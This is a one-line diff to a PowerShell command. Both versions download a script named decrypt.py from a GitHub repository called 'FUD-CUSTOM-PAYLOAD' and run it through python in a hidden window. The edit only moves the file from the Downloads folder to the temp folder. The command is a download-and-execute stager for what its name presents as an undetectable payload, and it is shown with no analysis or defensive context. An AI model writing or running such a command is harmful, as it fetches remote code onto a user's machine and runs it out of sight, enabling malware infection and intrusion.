@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/decrypt.py' -OutFile "$env:USERPROFILE\Downloads\decrypt.py"; Start-Process -FilePath 'python' -ArgumentList "$env:USERPROFILE\Downloads\decrypt.py" -WindowStyle Hidden
+$TempFile = [System.IO.Path]::Combine($env:TEMP, 'decrypt.py'); Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/gamkers/FUD-CUSTOM-PAYLOAD/main/decrypt.py' -OutFile $TempFile; Start-Process -FilePath 'python' -ArgumentList $TempFile -WindowStyle Hidden
